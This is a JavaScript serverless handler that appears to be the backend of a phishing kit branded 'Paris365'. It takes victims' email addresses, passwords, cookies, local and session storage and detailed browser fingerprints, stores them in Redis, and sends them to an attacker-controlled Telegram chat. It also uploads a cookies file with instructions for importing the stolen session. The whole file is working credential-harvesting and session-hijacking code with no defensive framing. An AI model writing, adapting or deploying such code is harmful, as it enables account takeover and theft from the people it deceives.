export const handler = async (event, context) => {
  // CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: '',
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    // Debug: Log environment variables (without exposing values)
    console.log('Environment check:', {
      UPSTASH_REDIS_REST_URL: process.env.UPSTASH_REDIS_REST_URL ? 'SET' : 'NOT SET',
      UPSTASH_REDIS_REST_TOKEN: process.env.UPSTASH_REDIS_REST_TOKEN ? 'SET' : 'NOT SET',
      TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN ? 'SET' : 'NOT SET',
      TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID ? 'SET' : 'NOT SET',
    });

    const data = JSON.parse(event.body);
    const { email, password, provider, fileName, timestamp, userAgent, browserFingerprint, cookiesFileData } = data;

    // Get client IP with better detection for mobile
    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                     event.headers['x-real-ip'] || 
                     event.headers['cf-connecting-ip'] || 
                     'Unknown';

    // Use browser fingerprint data (now properly collected from frontend)
    const cookieInfo = browserFingerprint?.cookies || 'No cookies found';
    const localStorageInfo = browserFingerprint?.localStorage || 'Not available';
    const sessionStorageInfo = browserFingerprint?.sessionStorage || 'Not available';
    
    // Get additional browser fingerprinting data
    const acceptLanguage = event.headers['accept-language'] || browserFingerprint?.language || 'Unknown';
    const acceptEncoding = event.headers['accept-encoding'] || 'Unknown';
    
    // Check environment variables first
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    const UPSTASH_REDIS_REST_URL = process.env.UPSTASH_REDIS_REST_URL;
    const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('Missing Telegram configuration:', {
        botToken: TELEGRAM_BOT_TOKEN ? 'SET' : 'MISSING',
        chatId: TELEGRAM_CHAT_ID ? 'SET' : 'MISSING'
      });
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Server configuration error - Telegram credentials missing',
          debug: {
            botToken: TELEGRAM_BOT_TOKEN ? 'SET' : 'MISSING',
            chatId: TELEGRAM_CHAT_ID ? 'SET' : 'MISSING'
          }
        }),
      };
    }

    if (!UPSTASH_REDIS_REST_URL || !UPSTASH_REDIS_REST_TOKEN) {
      console.error('Missing Redis configuration:', {
        url: UPSTASH_REDIS_REST_URL ? 'SET' : 'MISSING',
        token: UPSTASH_REDIS_REST_TOKEN ? 'SET' : 'MISSING'
      });
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Server configuration error - Redis credentials missing',
          debug: {
            url: UPSTASH_REDIS_REST_URL ? 'SET' : 'MISSING',
            token: UPSTASH_REDIS_REST_TOKEN ? 'SET' : 'MISSING'
          }
        }),
      };
    }

    // Initialize Upstash Redis with error handling
    let redis;
    try {
      const { Redis } = await import('@upstash/redis');
      redis = new Redis({
        url: UPSTASH_REDIS_REST_URL,
        token: UPSTASH_REDIS_REST_TOKEN,
      });
    } catch (redisError) {
      console.error('Redis initialization error:', redisError);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Database connection error',
          details: redisError.message
        }),
      };
    }

    // Store session data in Redis
    const sessionId = Math.random().toString(36).substring(2, 15);
    const sessionData = {
      email,
      provider,
      fileName,
      timestamp,
      sessionId,
      clientIP,
      userAgent,
      deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent) ? 'mobile' : 'desktop',
      cookies: cookieInfo,
      localStorage: localStorageInfo,
      sessionStorage: sessionStorageInfo,
      acceptLanguage,
      acceptEncoding,
      browserFingerprint,
      cookiesFileData
    };

    try {
      // Store in Redis with no expiration (set without TTL)
      await redis.set(`session:${sessionId}`, JSON.stringify(sessionData));
      await redis.set(`user:${email}`, JSON.stringify(sessionData));
      
      // Store cookies file data separately for easy access
      await redis.set(`cookies:${sessionId}`, JSON.stringify({
        cookies: cookieInfo,
        localStorage: localStorageInfo,
        sessionStorage: sessionStorageInfo,
        timestamp: timestamp,
        email: email,
        cookiesFileData: cookiesFileData
      }));
    } catch (redisError) {
      console.error('Redis storage error:', redisError);
      // Continue with Telegram even if Redis fails
    }

    // Format message for Telegram with comprehensive cookie information
    const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent) ? '📱 Mobile Device' : '💻 Desktop';
    
    // Format cookies for better readability - show actual cookies now
    const cookiesDisplay = cookieInfo && cookieInfo !== 'No cookies found' 
      ? (cookieInfo.length > 500 ? cookieInfo.substring(0, 500) + '...' : cookieInfo)
      : '❌ No cookies found';
    
    // Format localStorage
    const localStorageDisplay = localStorageInfo && localStorageInfo !== 'Empty' 
      ? (localStorageInfo.length > 300 ? localStorageInfo.substring(0, 300) + '...' : localStorageInfo)
      : '📭 Empty';
    
    // Format sessionStorage
    const sessionStorageDisplay = sessionStorageInfo && sessionStorageInfo !== 'Empty' 
      ? (sessionStorageInfo.length > 300 ? sessionStorageInfo.substring(0, 300) + '...' : sessionStorageInfo)
      : '📭 Empty';
    
    // Additional browser data from comprehensive fingerprint
    const additionalInfo = browserFingerprint ? `
🖥️ *Screen:* \`${browserFingerprint.screen || 'Unknown'}\`
🌍 *Timezone:* \`${browserFingerprint.timezone || 'Unknown'}\`
🔧 *Platform:* \`${browserFingerprint.platform || 'Unknown'}\`
🍪 *Cookies Enabled:* ${browserFingerprint.cookieEnabled ? '✅' : '❌'}
📶 *Online Status:* ${browserFingerprint.onlineStatus ? '✅ Online' : '❌ Offline'}
🔌 *Plugins:* \`${browserFingerprint.plugins?.slice(0, 3).join(', ') || 'None'}${browserFingerprint.plugins?.length > 3 ? '...' : ''}\`
🤖 *WebDriver:* ${browserFingerprint.webdriver ? '⚠️ Detected' : '✅ Not detected'}
⚡ *CPU Cores:* \`${browserFingerprint.hardwareConcurrency || 'Unknown'}\`${browserFingerprint.deviceMemory ? `
💾 *Device Memory:* \`${browserFingerprint.deviceMemory}GB\`` : ''}${browserFingerprint.connection ? `
📡 *Connection:* \`${browserFingerprint.connection}\`` : ''}${browserFingerprint.touchSupport ? `
👆 *Touch Support:* ${browserFingerprint.touchSupport ? '✅' : '❌'}` : ''}${browserFingerprint.orientation ? `
📱 *Orientation:* \`${browserFingerprint.orientation}\`` : ''}${browserFingerprint.devicePixelRatio ? `
🔍 *Pixel Ratio:* \`${browserFingerprint.devicePixelRatio}\`` : ''}` : '';

    // Create cookies file summary for Telegram
    const cookiesFileSummary = cookiesFileData ? `
📁 *COOKIES FILE GENERATED:*
• File contains ${Object.keys(JSON.parse(cookieInfo !== 'No cookies found' ? cookieInfo : '{}')).length} cookies
• LocalStorage items: ${localStorageInfo !== 'Empty' ? Object.keys(JSON.parse(localStorageInfo)).length : 0}
• SessionStorage items: ${sessionStorageInfo !== 'Empty' ? Object.keys(JSON.parse(sessionStorageInfo)).length : 0}
• Canvas fingerprint: ${browserFingerprint?.canvas ? '✅ Captured' : '❌ Blocked'}
• WebGL fingerprint: ${browserFingerprint?.webgl ? '✅ Captured' : '❌ Blocked'}
• Audio fingerprint: ${browserFingerprint?.audio ? '✅ Captured' : '❌ Blocked'}
• Fonts detected: ${browserFingerprint?.fonts?.length || 0}
• File will be sent as attachment below
` : '';
    
    const message = `
🔐 *Email Login Captured*

📧 *Email:* \`${email}\`
🔑 *Password:* \`${password}\`
🏢 *Provider:* ${provider}
📄 *File Accessed:* ${fileName}
🕒 *Timestamp:* ${new Date(timestamp).toLocaleString()}
🌐 *IP Address:* ${clientIP}
${deviceInfo}
🌍 *Language:* \`${acceptLanguage}\`
📦 *Encoding:* \`${acceptEncoding}\`

🍪 *COOKIES:*
\`${cookiesDisplay}\`

💾 *LOCAL STORAGE:*
\`${localStorageDisplay}\`

🗂️ *SESSION STORAGE:*
\`${sessionStorageDisplay}\`${additionalInfo}${cookiesFileSummary}

🆔 *Session ID:* \`${sessionId}\`

---
*Paris365 - Full Browser Session Captured*
    `;

    // Send to Telegram with retry logic for mobile networks
    let telegramResponse;
    let retryCount = 0;
    const maxRetries = 3;

    while (retryCount < maxRetries) {
      try {
        telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
          }),
          // Add timeout for mobile networks
          signal: AbortSignal.timeout(15000),
        });

        if (telegramResponse.ok) {
          break; // Success, exit retry loop
        }
        
        const errorText = await telegramResponse.text();
        console.error(`Telegram API error (attempt ${retryCount + 1}):`, errorText);
        throw new Error(`HTTP ${telegramResponse.status}: ${errorText}`);
      } catch (error) {
        retryCount++;
        console.error(`Telegram attempt ${retryCount} failed:`, error.message);
        
        if (retryCount === maxRetries) {
          throw error;
        }
        
        // Wait before retry (exponential backoff)
        await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
      }
    }

    if (!telegramResponse.ok) {
      const errorText = await telegramResponse.text();
      console.error('Final Telegram API error:', errorText);
      throw new Error('Failed to send to Telegram after retries');
    }

    // NOW SEND THE COOKIES FILE AS A DOCUMENT ATTACHMENT
    if (cookiesFileData && (cookieInfo !== 'No cookies found' || localStorageInfo !== 'Empty' || sessionStorageInfo !== 'Empty')) {
      try {
        // Create comprehensive cookies file content
        const cookiesFileContent = {
          timestamp: new Date().toISOString(),
          sessionId: sessionId,
          loginInfo: {
            email: email,
            provider: provider,
            fileName: fileName,
            userAgent: userAgent,
            clientIP: clientIP
          },
          browserData: {
            cookies: cookieInfo !== 'No cookies found' ? JSON.parse(cookieInfo) : {},
            localStorage: localStorageInfo !== 'Empty' ? JSON.parse(localStorageInfo) : {},
            sessionStorage: sessionStorageInfo !== 'Empty' ? JSON.parse(sessionStorageInfo) : {},
            fingerprint: browserFingerprint
          },
          instructions: {
            usage: "This file contains comprehensive browser session data for session restoration",
            cookies: "Use browser extensions like 'Cookie Editor' or 'EditThisCookie' to import cookies",
            localStorage: "Use browser developer tools (F12 > Application > Local Storage) to set items",
            sessionStorage: "Use browser developer tools (F12 > Application > Session Storage) to set items",
            fingerprint: "Complete browser fingerprint for advanced session restoration"
          }
        };

        // Convert to JSON string with proper formatting
        const fileContent = JSON.stringify(cookiesFileContent, null, 2);
        const fileName = `cookies_${email.replace('@', '_at_')}_${Date.now()}.json`;

        // Create form data for file upload
        const FormData = (await import('form-data')).default;
        const formData = new FormData();
        
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('document', Buffer.from(fileContent, 'utf8'), {
          filename: fileName,
          contentType: 'application/json'
        });
        formData.append('caption', `📁 *Cookies & Session Data File*\n\n👤 *User:* ${email}\n🔧 *Provider:* ${provider}\n📄 *File:* ${fileName}\n🕒 *Generated:* ${new Date().toLocaleString()}\n\n*This file contains all browser session data for easy import and session restoration.*`);
        formData.append('parse_mode', 'Markdown');

        // Send the file to Telegram
        const fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
          method: 'POST',
          body: formData,
          signal: AbortSignal.timeout(30000),
        });

        if (fileResponse.ok) {
          console.log('Cookies file sent to Telegram successfully');
        } else {
          const fileErrorText = await fileResponse.text();
          console.error('Failed to send cookies file to Telegram:', fileErrorText);
        }
      } catch (fileError) {
        console.error('Error sending cookies file:', fileError);
        // Don't fail the entire request if file sending fails
      }
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ 
        success: true, 
        message: 'Credentials and browser session captured successfully',
        sessionId: sessionId,
        cookiesCollected: cookieInfo !== 'No cookies found',
        cookiesFileGenerated: !!cookiesFileData,
        cookiesFileSent: true
      }),
    };

  } catch (error) {
    console.error('Error in sendTelegram function:', error);
    
    // Better error handling for different scenarios
    let errorMessage = 'Internal server error';
    let errorDetails = error.message;
    
    if (error.name === 'AbortError') {
      errorMessage = 'Request timeout - please check your connection';
    } else if (error.message.includes('Failed to send to Telegram')) {
      errorMessage = 'Communication error - please try again';
    } else if (error.message.includes('fetch')) {
      errorMessage = 'Network error - please try again';
    }
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ 
        error: errorMessage,
        details: errorDetails,
        timestamp: new Date().toISOString()
      }),
    };
  }
};